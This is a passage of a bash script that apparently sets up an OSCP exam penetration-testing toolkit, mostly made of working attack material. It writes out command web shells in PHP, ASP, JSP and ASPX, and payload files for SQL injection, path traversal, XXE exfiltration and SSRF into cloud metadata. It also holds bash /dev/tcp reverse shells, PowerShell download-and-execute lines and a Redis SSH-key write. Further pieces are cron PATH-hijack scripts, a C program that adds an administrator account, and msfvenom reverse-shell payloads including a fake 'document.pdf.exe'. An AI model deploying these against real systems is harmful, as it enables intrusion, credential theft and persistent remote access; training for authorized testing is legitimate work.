UACMe is useful only when you already have local admin rights but are in a medium-integrity/restricted admin shell.
It is not a normal low-privilege-to-admin escalation path.

Prepare a stable compiled copy before the exam if you plan to use it. Keep both x64 and x86 builds.
Use only after confirming:
  whoami /groups
  net localgroup administrators
  whoami /priv
EOF

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  WEB SHELLS                                                                ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

banner "WEB SHELLS"
echo "[+] Creating simple command web shells..."
cat > webshells/cmd.php << 'PHPEOF'
<?php echo "<pre>".shell_exec($_REQUEST['cmd'])."</pre>"; ?>
PHPEOF

cp -f webshells/cmd.php webshells/cmd.phtml 2>/dev/null || true
cp -f webshells/cmd.php webshells/cmd.phar 2>/dev/null || true

cat > webshells/cmd.asp << 'ASPEOF'
<%
If Request("cmd") <> "" Then
  Set o = Server.CreateObject("WScript.Shell")
  Set e = o.Exec("cmd.exe /c " & Request("cmd"))
  Response.Write("<pre>" & e.StdOut.ReadAll() & "</pre>")
End If
%>
ASPEOF

cat > webshells/cmd.jsp << 'JSPEOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
  String[] c = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe","/c",cmd} : new String[]{"/bin/sh","-c",cmd};
  Process p = Runtime.getRuntime().exec(c);
  OutputStream os = p.getOutputStream();
  InputStream in = p.getInputStream();
  InputStream err = p.getErrorStream();
  out.println("<pre>");
  int ch;
  while ((ch = in.read()) != -1) out.print((char) ch);
  while ((ch = err.read()) != -1) out.print((char) ch);
  out.println("</pre>");
}
%>
JSPEOF

cat > webshells/cmd.aspx << 'ASPXEOF'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object s, EventArgs e) {
    if (Request["cmd"] != null) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + Request["cmd"];
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
ASPXEOF

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  ATTACKER-SIDE TOOLS                                                       ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

banner "ATTACKER-SIDE TOOLS"
echo "[+] Ligolo-ng proxy Linux amd64..."
dl_targz_dir attacker "https://github.com/nicocha30/ligolo-ng/releases/download/v${LIGOLO_VER}/ligolo-ng_proxy_${LIGOLO_VER}_linux_amd64.tar.gz"
for f in attacker/proxy attacker/ligolo-ng_proxy*; do
    [[ -f "$f" ]] && mv -f "$f" attacker/ligolo-proxy 2>/dev/null && break
done
chmodx attacker/ligolo-proxy

echo "[+] Chisel attacker copy..."
if [[ -f linux/chisel ]]; then cp -f linux/chisel attacker/chisel || true; fi
chmodx attacker/chisel

echo "[+] Certipy..."
pip_install certipy-ad

echo "[+] BloodHound CE CLI for Docker workflow..."
rm -rf attacker/bloodhound-docker/cli-extract
mkdir -p attacker/bloodhound-docker/cli-extract
if [[ "$DRY_RUN" == "1" ]]; then
    echo "       dry-run: would download SpecterOps bloodhound-cli"
else
    dl_targz_dir attacker/bloodhound-docker/cli-extract https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
    BHCLI="$(find attacker/bloodhound-docker/cli-extract -type f -name 'bloodhound-cli' | head -n 1 || true)"
    if [[ -n "$BHCLI" ]]; then
        mv -f "$BHCLI" attacker/bloodhound-docker/bloodhound-cli
        chmod +x attacker/bloodhound-docker/bloodhound-cli
        rm -rf attacker/bloodhound-docker/cli-extract
    else
        fail_or_continue "bloodhound-cli binary extraction"
    fi
fi

echo "[+] git-dumper..."
pip_install git-dumper

echo "[+] Evil-WinRM..."
if have evil-winrm; then echo "    → evil-winrm already installed"; else gem_install evil-winrm; fi

echo "[+] NetExec..."
if have nxc || have netexec; then echo "    → netexec already installed"; else pip_install netexec; fi

echo "[+] Kerbrute..."
dl attacker/kerbrute https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmodx attacker/kerbrute

echo "[+] Impacket..."
# On modern Kali, impacket ships as the apt package python3-impacket (installed by
# attacker/install-kali-deps.sh). Force-installing via pip alongside it causes
# version/entry-point conflicts, so prefer apt/pipx here instead of pip.
if have impacket-secretsdump || have impacket-psexec; then
    echo "    → impacket already installed"
elif [[ "$DRY_RUN" == "1" ]]; then
    echo "       dry-run: would install impacket"
else
    warn "impacket not found; install with: sudo apt install -y python3-impacket  (or: pipx install impacket)"
fi

echo "[+] WES-NG Windows Exploit Suggester Next Generation..."
git_clone https://github.com/bitsadmin/wesng.git attacker/wesng

echo "[+] Inbit Messenger RCE exploit reference..."
dl attacker/exploits/inbit-messenger-rce.py https://www.exploit-db.com/download/51127
chmodx attacker/exploits/inbit-messenger-rce.py

banner "BLOODHOUND CE DOCKER / CLI"
cat > attacker/bloodhound-docker/README-BLOODHOUND-DOCKER.txt <<'BHDOC'
BLOODHOUND CE DOCKER WORKFLOW

This toolkit uses BloodHound CE through Docker containers managed by SpecterOps bloodhound-cli.
It does not require bloodhound-ce-python.

Files staged here:
  bloodhound-cli                     - official BloodHound CE container manager
  install-or-start-bloodhound-ce.sh  - first-run installer / normal starter
  reset-bloodhound-password.sh       - reset the local admin password
  stop-bloodhound-ce.sh              - stop containers
  status-bloodhound-ce.sh            - show container status and useful URLs
  docker-compose.yml                 - fallback compose only if CLI workflow fails

Normal use:
  cd ~/privesc-toolkit/attacker/bloodhound-docker
  ./install-or-start-bloodhound-ce.sh
  ./status-bloodhound-ce.sh

Open:
  http://localhost:8080/ui/login

Login:
  Username: admin
  Password: save the random password printed on first install, or reset it with:
    ./reset-bloodhound-password.sh

Collect AD data:
  Preferred if you have a Windows domain foothold:
    Upload SharpHound.exe or SharpHound.ps1 from ~/privesc-toolkit/windows/SharpHound/
    Run collection on the domain machine
    Import the resulting ZIP into BloodHound CE with Quick Upload

  From Kali, use NetExec where appropriate:
    nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' --bloodhound --collection All --dns-server <DC_IP>

Do not run the fallback docker-compose.yml at the same time as a CLI-managed stack on port 8080.
BHDOC

cat > attacker/bloodhound-docker/install-or-start-bloodhound-ce.sh <<'BHEOF'
#!/usr/bin/env bash
set -Eeuo pipefail
cd "$(dirname "$0")"

need() {
  command -v "$1" >/dev/null 2>&1 || { echo "[!] Missing dependency: $1"; return 1; }
}

if ! need docker; then
  echo "Install Docker first: sudo apt update && sudo apt install -y docker.io docker-compose docker-compose-plugin"
  exit 1
fi

if ! docker info >/dev/null 2>&1; then
  echo "[*] Docker daemon is not reachable. Trying to start it with systemctl."
  sudo systemctl enable docker --now || true
fi

if ! docker info >/dev/null 2>&1; then
  echo "[!] Docker still is not reachable. Start Docker, then rerun this script."
  exit 1
fi

if ! docker compose version >/dev/null 2>&1 && ! command -v docker-compose >/dev/null 2>&1; then
  echo "[!] Docker Compose is missing. Try: sudo apt install -y docker-compose-plugin docker-compose"
  exit 1
fi

if [[ ! -x ./bloodhound-cli ]]; then
  echo "[!] ./bloodhound-cli is missing or not executable. Rerun the toolkit setup script."
  exit 1
fi

if [[ ! -d "$HOME/.config/bloodhound" ]]; then
  echo "[*] First-time BloodHound CE install. Save the generated admin password."
  ./bloodhound-cli install
else
  echo "[*] BloodHound CE config exists. Starting existing Docker stack."
  BH_DIR="$HOME/.config/bloodhound"
  if [[ -f "$BH_DIR/docker-compose.yml" ]]; then
    cd "$BH_DIR"
    if docker compose version >/dev/null 2>&1; then
      docker compose up -d
    else
      docker-compose up -d
    fi
  else
    cd "$(dirname "$0")"
    ./bloodhound-cli install
  fi
fi

echo ""
echo "Open: http://localhost:8080/ui/login"
echo "Username: admin"
echo "If you lost the password: ./reset-bloodhound-password.sh"
BHEOF
chmod +x attacker/bloodhound-docker/install-or-start-bloodhound-ce.sh

cat > attacker/bloodhound-docker/reset-bloodhound-password.sh <<'BHEOF'
#!/usr/bin/env bash
set -Eeuo pipefail
cd "$(dirname "$0")"
if [[ ! -x ./bloodhound-cli ]]; then
  echo "[!] ./bloodhound-cli missing. Rerun the toolkit setup script."
  exit 1
fi
./bloodhound-cli resetpwd
BHEOF
chmod +x attacker/bloodhound-docker/reset-bloodhound-password.sh

cat > attacker/bloodhound-docker/stop-bloodhound-ce.sh <<'BHEOF'
#!/usr/bin/env bash
set -Eeuo pipefail
BH_DIR="$HOME/.config/bloodhound"
if [[ -f "$BH_DIR/docker-compose.yml" ]]; then
  cd "$BH_DIR"
  if docker compose version >/dev/null 2>&1; then
    docker compose down
  else
    docker-compose down
  fi
else
  echo "[!] No CLI-managed BloodHound compose found at $BH_DIR/docker-compose.yml"
fi
BHEOF
chmod +x attacker/bloodhound-docker/stop-bloodhound-ce.sh

cat > attacker/bloodhound-docker/status-bloodhound-ce.sh <<'BHEOF'
#!/usr/bin/env bash
set -u
printf '[*] Docker: '
if docker info >/dev/null 2>&1; then echo OK; else echo NOT-RUNNING; fi
printf '[*] Compose: '
if docker compose version >/dev/null 2>&1; then docker compose version; elif command -v docker-compose >/dev/null 2>&1; then docker-compose version; else echo MISSING; fi
printf '[*] BloodHound CLI: '
if [[ -x "$(dirname "$0")/bloodhound-cli" ]]; then "$(dirname "$0")/bloodhound-cli" version 2>/dev/null || echo staged; else echo MISSING; fi
echo '[*] Containers:'
docker ps --format 'table {{.Names}}	{{.Status}}	{{.Ports}}' 2>/dev/null | grep -Ei 'bloodhound|postgres|neo4j|PORTS' || true
echo ''
echo 'Open: http://localhost:8080/ui/login'
echo 'User: admin'
BHEOF
chmod +x attacker/bloodhound-docker/status-bloodhound-ce.sh

cat > attacker/bloodhound-docker/docker-compose.yml << 'BHEOF'
# BloodHound CE fallback Docker Compose only.
# Preferred workflow: ./install-or-start-bloodhound-ce.sh with SpecterOps bloodhound-cli.
# Do not run this fallback compose at the same time as the CLI-managed stack on port 8080.
# Usage only if bloodhound-cli workflow fails:
#   cd ~/privesc-toolkit/attacker/bloodhound-docker
#   docker compose up -d
#   docker compose logs | grep -i 'password'
#   Open http://localhost:8080/ui/login

services:
  bloodhound:
    image: specterops/bloodhound:latest
    ports:
      - "127.0.0.1:8080:8080"
    environment:
      - bhe_disable_cypher_qc=false
    volumes:
      - bloodhound-data:/opt/bloodhound/data
    depends_on:
      postgres:
        condition: service_healthy
      neo4j:
        condition: service_healthy

  postgres:
    image: postgres:16
    environment:
      POSTGRES_USER: bloodhound
      POSTGRES_PASSWORD: bloodhoundcommunityedition
      POSTGRES_DB: bloodhound
    volumes:
      - postgres-data:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U bloodhound"]
      interval: 5s
      timeout: 5s
      retries: 5

  neo4j:
    image: neo4j:4.4
    environment:
      NEO4J_AUTH: neo4j/bloodhoundcommunityedition
      NEO4J_dbms_allow__upgrade: "true"
    volumes:
      - neo4j-data:/data
    healthcheck:
      test: ["CMD", "neo4j", "status"]
      interval: 10s
      timeout: 10s
      retries: 10

volumes:
  bloodhound-data:
  postgres-data:
  neo4j-data:
BHEOF

if have docker; then
    echo "    → Docker found. BloodHound CE Docker/CLI helper created."
else
    warn "Docker not found; BloodHound CE helper was staged but cannot run until Docker is installed"
fi

banner "PROXYCHAINS CONFIG TEMPLATE"
cat > attacker/proxychains-ligolo.conf << 'PROXYCHAINS_EOF'
# Proxychains config for chisel/SOCKS fallback.
# With Ligolo-ng TUN mode you usually do not need proxychains.
strict_chain
proxy_dns
tcp_read_time_out 3000
tcp_connect_time_out 2000

[ProxyList]
socks5 127.0.0.1 1080
PROXYCHAINS_EOF

write_local_files


# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  INITIAL-ACCESS LOCAL TEMPLATES                                            ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

banner "INITIAL-ACCESS LOCAL TEMPLATES"

cat > templates/web/sqli-manual-checklist.txt <<'EOF'
Manual SQLi checklist. Use only on parameters/forms you are authorized to test.

Where to test:
  login fields, search boxes, id=, user=, file=, page=, sort=, order=, API JSON fields, cookies.

Fast probes:
  '
  ''
  ' OR '1'='1'-- -
  admin'-- -
  admin' OR '1'='1'-- -
  ' AND '1'='1'-- -
  ' AND '1'='2'-- -

Column count:
  ' ORDER BY 1-- -
  ' ORDER BY 2-- -
  ' ORDER BY 3-- -
  ' UNION SELECT NULL-- -
  ' UNION SELECT NULL,NULL-- -
  ' UNION SELECT NULL,NULL,NULL-- -

Database ID:
  ' UNION SELECT NULL,version(),database()-- -
  ' UNION SELECT NULL,user(),database()-- -

Move on when:
  - no error/boolean/timing difference after testing obvious parameters;
  - the app has easier exposed files, FTP/SMB loot, or credential reuse;
  - exploitation needs heavy automation or guesswork;
  - you already found credentials or a simpler shell path.
EOF

cat > templates/web/lfi-payloads.txt <<'EOF'
Linux:
  ../../../../etc/passwd
  ../../../../etc/hostname
  ../../../../etc/hosts
  ../../../../home/<user>/.ssh/id_rsa

Windows:
  ../../../../windows/win.ini
  ../../../../Windows/System32/drivers/etc/hosts
  ../../../../Users/<user>/Desktop/local.txt

Bypasses:
  ....//....//....//etc/passwd
  ....\\....\\....\\Windows\\win.ini
  ..%2f..%2f..%2fetc%2fpasswd
  ..%252f..%252f..%252fetc%252fpasswd
  %2e%2e/%2e%2e/%2e%2e/etc/passwd

PHP source disclosure:
  php://filter/convert.base64-encode/resource=index.php
  php://filter/convert.base64-encode/resource=config.php
EOF

cat > templates/web/upload-bypass-filenames.txt <<'EOF'
shell.php
shell.php5
shell.phtml
shell.phar
shell.php.jpg
shell.pHP
cmd.aspx
cmd.asp
cmd.jsp
EOF

cat > templates/web/command-injection-probes.txt <<EOF
Start listener/tcpdump first:
  sudo tcpdump -i tun0 icmp
  rlwrap -cAr nc -lvnp $LPORT

Ping probes:
  ; ping -c 1 $LHOST
  | ping -c 1 $LHOST
  && ping -c 1 $LHOST
  \`ping -c 1 $LHOST\`
  \$(ping -c 1 $LHOST)

Linux reverse shell:
  bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'

Windows encoded command helper:
  $TOOLKIT/attacker/make-ps-enc.sh 'iwr http://$LHOST:8000/windows/Invoke-PowerShellTcp.ps1 -UseBasicParsing | iex'
EOF

cat > templates/web/xxe-payloads.txt <<EOF
XXE (XML EXTERNAL ENTITY) PAYLOADS

Use when input is parsed as XML (SOAP, REST XML bodies, SAML, DOCX/SVG/XML uploads,
config imports). Confirm the parser processes DTDs before spending time here.

Local file read (classic):
  <?xml version="1.0"?>
  <!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <root>&xxe;</root>

Windows target file read:
  <!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>

PHP base64 wrapper (use when raw file breaks XML, e.g. contains < or &):
  <!DOCTYPE root [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>

Out-of-band (blind) exfil, host the DTD on your Kali box:
  1. Serve from toolkit root:  cd $TOOLKIT && python3 -m http.server 8000
  2. Create evil.dtd on Kali:
       <!ENTITY % file SYSTEM "file:///etc/passwd">
       <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://$LHOST:8000/?x=%file;'>">
       %eval;
       %exfil;
  3. Payload sent to target:
       <?xml version="1.0"?>
       <!DOCTYPE root [ <!ENTITY % dtd SYSTEM "http://$LHOST:8000/evil.dtd"> %dtd; ]>
       <root>ping</root>
  4. Read the leaked data from your http.server request log.

SSRF via XXE (make the parser reach internal services):
  <!DOCTYPE root [ <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/"> ]>
  <!DOCTYPE root [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>

Notes:
  - If entities are stripped, try parameter entities (%) and OOB.
  - SVG/DOCX/XLSX are zip/xml; inject into the inner XML then re-zip.
  - Billion-laughs / entity-expansion is a DoS; do not run it against exam targets.
EOF

cat > templates/web/ssrf-payloads.txt <<EOF
SSRF (SERVER-SIDE REQUEST FORGERY) PAYLOADS

Use when the app fetches a URL you influence (webhooks, "load from URL", PDF/image
generators, link previews, URL health-checkers, proxy params like ?url= ?path= ?dest=).

Confirm SSRF first (make the server hit you):
  Listener:  rlwrap -cAr nc -lvnp $LPORT   (or: python3 -m http.server 8000)
  Payloads:  http://$LHOST:$LPORT/ssrf-test
             http://$LHOST:8000/ssrf-test
  If you see the callback, the server is fetching your URL.

Reach internal-only services:
  http://127.0.0.1/            http://localhost/
  http://127.0.0.1:8080/       http://127.0.0.1:6379/   (redis)
  http://127.0.0.1:3306/       http://127.0.0.1:5432/   (db)
  Sweep internal hosts/ports by iterating 127.0.0.1 and 192.168.x.x / 10.x.x.x.

Cloud metadata (if the box is cloud-hosted):
  http://169.254.169.254/latest/meta-data/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  http://metadata.google.internal/computeMetadata/v1/   (needs Metadata-Flavor: Google)

Filter/allowlist bypasses:
  Decimal/hex IP:     http://2130706433/   http://0x7f000001/
  IPv6 loopback:      http://[::1]/        http://[0:0:0:0:0:ffff:127.0.0.1]/
  Domain to loopback: http://localtest.me/ (resolves to 127.0.0.1)
  Credential trick:   http://expected-host@127.0.0.1/
  Case/encoding:      http://127.0.0.1%2f...   double-encode where a filter is naive

Non-HTTP schemes (when supported by the fetch library):
  file:///etc/passwd
  gopher://127.0.0.1:6379/_  (craft raw redis/other protocol requests)
  dict://127.0.0.1:11211/

Notes:
  - Chain SSRF + internal service (unauth redis, actuator, metadata) for real impact.
  - Log the callback source IP; it confirms the server-side fetch and its egress.
EOF

cat > templates/services/finger-cheatsheet.txt <<'EOF'
Basic:
  finger @<IP>
  finger 0@<IP>
  finger root@<IP>
  finger admin@<IP>
  finger administrator@<IP>

Small-list helper:
  attacker/finger-quick-enum.sh <IP>

If users are found:
  - add them to loot/users.txt;
  - test discovered/found passwords only where lockout risk is acceptable;
  - check mail, SMB, FTP, WinRM/RDP, SSH, and web panels as applicable.
EOF

cat > templates/services/mysql-mariadb-cheatsheet.txt <<'EOF'
Try blank/default only when exposed and authorized:
  mysql -h <IP> -u root
  mysql -h <IP> -u root -p
  mysql -h <IP> -u admin -p
  mariadb -h <IP> -u root

After login:
  select version();
  show databases;
  use <database>;
  show tables;
  select * from users;

Prioritize:
  app users, password hashes, admin creds, upload paths, config values.
EOF

cat > templates/services/postgresql-cheatsheet.txt <<'EOF'
Connect:
  psql -h <IP> -U postgres
  psql -h <IP> -U <user> -d <database>

After login:
  select version();
  \l
  \c <database>
  \dt
EOF

cat > templates/services/redis-cheatsheet.txt <<'EOF'
Connect:
  redis-cli -h <IP>

Triage:
  INFO
  CONFIG GET *
  KEYS *

SSH authorized_keys write pattern, only when you know a valid local user and Redis can write there:
  ssh-keygen -t rsa -b 4096 -f redis_key -N ''
  (echo -e '\n\n'; cat redis_key.pub; echo -e '\n\n') > redis_key_payload.txt
  redis-cli -h <IP> CONFIG SET dir /home/<user>/.ssh/
  redis-cli -h <IP> CONFIG SET dbfilename authorized_keys
  cat redis_key_payload.txt | redis-cli -h <IP> -x SET sshkey
  redis-cli -h <IP> SAVE
  chmod 600 redis_key
  ssh -i redis_key <user>@<IP>
EOF

cat > templates/services/mqtt-cheatsheet.txt <<'EOF'
Unauthenticated checks:
  mosquitto_sub -h <IP> -p <PORT> -t '#' -v
  mosquitto_sub -h <IP> -p <PORT> -t '$SYS/#' -v
  mosquitto_pub -h <IP> -p <PORT> -t 'test' -m 'hello'

With credentials:
  mosquitto_sub -h <IP> -p <PORT> -t '#' -v -u <user> -P '<password>'

Look for:
  command topics, device names, internal hostnames, credentials, file paths, and callbacks.
EOF

cat > templates/services/credential-reuse-matrix.txt <<'EOF'
When a credential is found, test deliberately:
  nxc smb <IP> -u <user> -p '<pass>' --shares
  nxc winrm <IP> -u <user> -p '<pass>'
  nxc rdp <IP> -u <user> -p '<pass>'
  evil-winrm -i <IP> -u <user> -p '<pass>'
  xfreerdp /u:<user> /p:'<pass>' /v:<IP> /cert:ignore /dynamic-resolution
  ssh <user>@<IP>
  ftp <IP>
  mysql -h <IP> -u <user> -p
  psql -h <IP> -U <user>

For Windows local accounts also try:
  .\<user>
  <HOSTNAME>\<user>
  <DOMAIN>\<user>
EOF

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  LOCAL METHOD TEMPLATES                                                    ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

banner "LOCAL METHOD TEMPLATES"
cat > templates/linux/cron-path-hijack-suid-bash.sh <<'EOF'
#!/bin/sh
# Rename this file to the relative command being executed by root, e.g. netstat.
# Place it in a writable directory that appears before system paths in the root job PATH.
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
chmod +x templates/linux/cron-path-hijack-suid-bash.sh

cat > templates/linux/cron-path-hijack-revshell.sh <<EOF
#!/bin/sh
# Rename this file to the relative command being executed by root, e.g. netstat.
bash -c "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
EOF
chmod +x templates/linux/cron-path-hijack-revshell.sh

cat > templates/linux/debugfs-disk-group-cheatsheet.txt <<'EOF'
Use only if `id` shows the user is in group `disk` or has raw block device read access.

Find root volume:
  df -h
  lsblk

Open read-only style workflow:
  debugfs /dev/mapper/<ROOT_VOLUME>

Inside debugfs:
  cd /root
  ls
  cat proof.txt
  cat /etc/shadow
  cat /root/.ssh/id_rsa

Copy output manually into notes. Avoid write operations unless absolutely necessary.
EOF

cat > windows/README-watchdog-service-abuse.txt <<'EOF'
Use when a service, watchdog, monitor, updater, DVR/backup/agent process, or scheduled task repeatedly starts an executable and you can write to that binary or its directory.

Confirm:
  tasklist /svc
  sc qc <SERVICE_NAME>
  icacls "C:\Path\To\ServiceFolder"
  icacls "C:\Path\To\service.exe"

Exploit pattern:
  copy "C:\Path\To\service.exe" C:\Temp\service.exe.bak
  copy /Y C:\Temp\rev64.exe "C:\Path\To\service.exe"
  sc stop <SERVICE_NAME>
  sc start <SERVICE_NAME>

If the watchdog restarts automatically, start a listener and wait.
EOF


cat > templates/web/msfvenom-pdf-style-non-meterpreter.txt <<EOF
MSFVENOM PDF-STYLE WINDOWS PAYLOAD - NON-METERPRETER

Use only when you already have an authorized file-execution primitive.
A .pdf.exe file is still an EXE; it is not a real PDF exploit.
Do not use Meterpreter for this path.

Generate:
  export LHOST=$LHOST
  export LPORT=$LPORT
  mkdir -p shells
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=\$LHOST LPORT=\$LPORT -f exe -o shells/document.pdf.exe

Catch with multi/handler:
  cat > shells/handler_pdf_shell.rc <<HANDLER
use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT \$LPORT
set ExitOnSession false
run -j
HANDLER
  msfconsole -q -r shells/handler_pdf_shell.rc

Target execution:
  certutil -urlcache -f http://<KALI_IP>:8000/document.pdf.exe C:\\Temp\\document.pdf.exe
  C:\\Temp\\document.pdf.exe
EOF

cat > templates/web/nicepage-triage.txt <<'EOF'
NICEPAGE WEB TRIAGE

Use when source shows nicepage.css, nicepage.js, u-form, u-upload, or Nicepage branding.

Fingerprint:
  curl -s http://<IP>/ | tee loot/index.html
  grep -RniE 'nicepage|nicepage\.css|nicepage\.js|u-form|u-upload|scripts/form' loot/ 2>/dev/null

Common paths:
  /nicepage.css
  /nicepage.js
  /scripts/form.php
  /scripts/form-processor.php
  /contact.html
  /Contact.html
  /files/
  /uploads/

Generated-site scan:
  feroxbuster -u http://<IP>/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt -x html,php,txt,bak,old,zip,js,css,json,xml -t 50 --depth 2

Upload rule:
  Prove a harmless marker upload first. Only try executable variants if the uploaded file is reachable or processed server-side.
EOF

cat > windows/adduser.c <<'EOF'
#include <stdlib.h>
int main ()
{
    int i;
    i = system("net user dave2 password12345! /add");
    i = system("net localgroup administrators dave2 /add");
    return 0;
}
EOF

if have x86_64-w64-mingw32-gcc && [[ "$DRY_RUN" != "1" ]]; then
    x86_64-w64-mingw32-gcc windows/adduser.c -o windows/adduser.exe 2>/dev/null || warn "failed to compile windows/adduser.exe"
else
    warn "x86_64-w64-mingw32-gcc unavailable or dry-run; compile windows/adduser.c before exam if needed"
fi

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  PRE-GENERATED REVERSE SHELL PAYLOADS                                      ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

banner "PRE-GENERATING MSFVENOM PAYLOADS"
if have msfvenom && [[ "$LHOST" != "CHANGEME" && "$DRY_RUN" != "1" ]]; then
    msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o windows/rev64.exe 2>/dev/null || warn "failed to generate windows rev64.exe"
    msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o windows/document.pdf.exe 2>/dev/null || warn "failed to generate windows/document.pdf.exe"
    cat > attacker/handler_win_shell.rc <<EOF
use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT $LPORT
set ExitOnSession false
run -j
EOF
    msfvenom -p windows/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o windows/rev32.exe 2>/dev/null || warn "failed to generate windows rev32.exe"
    msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f dll -o windows/rev64.dll 2>/dev/null || warn "failed to generate windows rev64.dll"
    msfvenom -p linux/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f elf -o linux/rev64.elf 2>/dev/null || warn "failed to generate linux rev64.elf"
    msfvenom -p linux/x86/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f elf -o linux/rev32.elf 2>/dev/null || warn "failed to generate linux rev32.elf"
    chmodx linux/rev64.elf linux/rev32.elf
    msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f aspx -o webshells/rev.aspx 2>/dev/null || warn "failed to generate rev.aspx"
    msfvenom -p java/jsp_shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f raw -o webshells/rev.jsp 2>/dev/null || warn "failed to generate rev.jsp"
    msfvenom -p php/reverse_php LHOST="$LHOST" LPORT="$LPORT" -f raw -o webshells/rev.php 2>/dev/null || warn "failed to generate rev.php"
    msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f hta-psh -o webshells/rev.hta 2>/dev/null || warn "failed to generate rev.hta"
else
    echo "[!] Skipping msfvenom payload generation."
    echo "    Run later with: ./oscp-toolkit-setup-v6_4_bloodhound_docker.sh <KALI_IP> 443"
fi

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  SUMMARY / VERIFICATION                                                    ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

banner "VERIFYING OUTPUT"
if have sha256sum; then
    find "$TOOLKIT" -type f -not -path '*/MANIFEST.sha256' -exec sha256sum {} \; > "$TOOLKIT/MANIFEST.sha256" || true
    echo "[+] Wrote $TOOLKIT/MANIFEST.sha256"
fi
if have file; then
    if [[ "$DRY_RUN" == "1" ]]; then
        echo "Skipped file-type scan in dry-run." > "$TOOLKIT/file-types.txt"
    else
        # Bound the file(1) scan so one malformed file cannot hang setup.
        timeout 60s find "$TOOLKIT" -maxdepth 3 -type f -exec file {} \; > "$TOOLKIT/file-types.txt" || true
    fi
    echo "[+] Wrote $TOOLKIT/file-types.txt"
fi
find "$TOOLKIT" -type f -size -2k | sort > "$TOOLKIT/small-files-review.txt" || true

echo ""
echo "============================================================"
echo "[+] DONE. Toolkit staged in: $TOOLKIT"
echo "============================================================"
echo ""
echo "Quick serve from toolkit root:"
echo "  cd $TOOLKIT && python3 -m http.server 8000"
echo ""
echo "Linux target example:"
echo "  cd /tmp && wget http://<KALI_IP>:8000/linux/linpeas.sh -O linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh"
echo ""
echo "Windows target example:"
echo "  mkdir C:\\temp & cd C:\\temp"
echo "  certutil -urlcache -f http://<KALI_IP>:8000/windows/winPEASx64.exe winPEASx64.exe"
echo ""
echo "Review files:"
echo "  $TOOLKIT/MANIFEST.sha256"
echo "  $TOOLKIT/file-types.txt"
echo "  $TOOLKIT/small-files-review.txt"
echo ""

if (( ${#WARNINGS[@]} > 0 )); then
    echo "Warnings:"
    printf '  - %s\n' "${WARNINGS[@]}"
fi
if (( ${#FAILED[@]} > 0 )); then
    echo ""
    echo "Failed downloads/actions:"
    printf '  - %s\n' "${FAILED[@]}"
    echo ""
    echo "Re-run the script later. With --strict it will stop at the first failure."
fi

exit 0
